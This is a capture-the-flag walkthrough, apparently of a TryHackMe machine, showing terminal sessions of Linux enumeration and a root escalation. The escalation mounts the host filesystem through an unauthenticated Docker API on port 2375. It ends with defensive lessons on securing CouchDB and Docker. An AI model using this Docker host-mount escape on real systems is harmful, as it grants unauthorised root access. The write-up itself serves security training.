      
      
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769457857425/c2851cf2-f501-4506-baea-fc66fd2cf9ce.png align="center")
    
    ```bash
    find / -perm -4000 -type f 2>/dev/null
    /bin/umount
    /bin/su
    /bin/mount
    /bin/ping
    /bin/ping6
    /bin/fusermount
    /usr/bin/vmware-user-suid-wrapper
    /usr/bin/chfn
    /usr/bin/chsh
    /usr/bin/passwd
    /usr/bin/gpasswd
    /usr/bin/newgrp
    /usr/bin/sudo
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/openssh/ssh-keysign
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    atena@ubuntu:~$ su -c /bin/sh
    Password: 
    
    su: Authentication failure
    atena@ubuntu:~$ 
    atena@ubuntu:~$ ls -la /usr/bin/vmware-user-suid-wrapper
    -rwsr-xr-x 1 root root 10624 May  8  2018 /usr/bin/vmware-user-suid-wrapper
    atena@ubuntu:~$ 
    
    
    ls -la /usr/bin/vmware-user-suid-wrapper
    
    -rwsr-xr-x 1 root root 10624 May  8  2018 /usr/bin/vmware-user-suid-wrapper
    
    uname -a
    
    Linux ubuntu 4.4.0-193-generic #224-Ubuntu SMP Tue Oct 6 17:15:28 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
    
    
    
    cat /etc/lsb-release
    
    DISTRIB_ID=Ubuntu
    
    DISTRIB_RELEASE=16.04
    
    DISTRIB_CODENAME=xenial
    
    DISTRIB_DESCRIPTION="Ubuntu 16.04.7 LTS"
    
    
    
    ps aux | grep couchdb
    
    couchdb    771  0.0  2.4 365296 24352 ?        Ssl  11:21   0:00 /usr/lib/erlang/erts-7.3/bin/beam -Bd -K true -A 4 -- -root /usr/lib/erlang -progname erl -- -home /var/lib/couchdb -- -noshell -noinput -os_mon start_memsup false start_cpu_sup false disk_space_check_interval 1 disk_almost_full_threshold 1 -sasl errlog_type error -couch_ini /etc/couchdb/default.ini /etc/couchdb/local.ini -s couch
    
    couchdb    871  0.0  0.0   4500   840 ?        Ss   11:21   0:00 sh -s disksup
    
    atena     1284  0.0  0.0  14220   936 pts/0    S+   11:28   0:00 grep --color=auto couchdb
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769457885773/edeaf333-e941-48f4-bc72-60e93505ecf2.png align="center")
    
      
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769457897607/23ab3bd1-619e-4ef7-8320-189efd5d85ad.png align="center")
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769457910126/d5f70744-c644-4b04-a057-9b383dfe4c82.png align="center")
    
    ```bash
    netstat -tlnp | grep 2375
    (Not all processes could be identified, non-owned process info
     will not be shown, you would have to be root to see it all.)
    tcp        0      0 127.0.0.1:2375          0.0.0.0:*               LISTEN      -               
    $ ss -tlnp | grep 2375
    LISTEN     0      128    127.0.0.1:2375                     *:*                  
    
    which docker
    /usr/bin/docker
    $ docker --version
    Docker version 18.09.7, build 2d0083d
    $ curl http://127.0.0.1:2375/version
    {"Platform":{"Name":""},"Components":[{"Name":"Engine","Version":"18.09.7","Details":{"ApiVersion":"1.39","Arch":"amd64","BuildTime":"2020-10-14T17:25:58.000000000+00:00","Experimental":"false","GitCommit":"2d0083d","GoVersion":"go1.10.4","KernelVersion":"4.4.0-193-generic","MinAPIVersion":"1.12","Os":"linux"}}],"Version":"18.09.7","ApiVersion":"1.39","MinAPIVersion":"1.12","GitCommit":"2d0083d","GoVersion":"go1.10.4","Os":"linux","Arch":"amd64","KernelVersion":"4.4.0-193-generic","BuildTime":"2020-10-14T17:25:58.000000000+00:00"}
    $ docker -H tcp://127.0.0.1:2375 images
    REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
    alpine              latest              389fef711851        5 years ago         5.58MB
    $ docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt alpine chroot /mnt /bin/sh
    # whoami
    root
    # find / -type f -name root.txt 2>/dev/null
    /root/root.txt
    # cat /root/root.txt
    THM{RCE_us1ng_Docker_API}
    # 
    ```
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769457925524/1089e3bd-2fa5-422a-888c-787a41e3e8c1.png align="center")
    
      
    
    ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1769457940080/3db230e3-fafd-47b5-93d8-c133442c80a3.png align="center")
    
      
    **CONCLUSION**
    
    This challenge demonstrated a realistic attack chain that combines multiple security weaknesses commonly found in production environments. The vulnerability path started with an exposed CouchDB instance lacking authentication, which allowed us to enumerate databases and extract hardcoded credentials from the "secret" database. After gaining initial SSH access as the user "atena," we discovered a Docker API listening on [localhost](http://localhost) port 2375 without authentication - a critical misconfiguration that allowed us to mount the host filesystem and escape to root privileges.
    
    Key lessons learned from this exercise include the importance of implementing authentication on all database services, avoiding storage of credentials in databases even when they seem "internal," and properly securing Docker daemon sockets. The Docker privilege escalation technique used here (mounting the host root filesystem into a container) is a well-known attack vector that highlights why Docker socket access should be treated with the same care as root access. Organizations should ensure Docker APIs are never exposed without TLS authentication, use Unix sockets with proper file permissions instead of TCP sockets when possible, and implement the principle of least privilege for all service accounts. This box serves as an excellent reminder that modern infrastructure security requires understanding not just traditional vulnerabilities, but also the security implications of containerization and API exposure.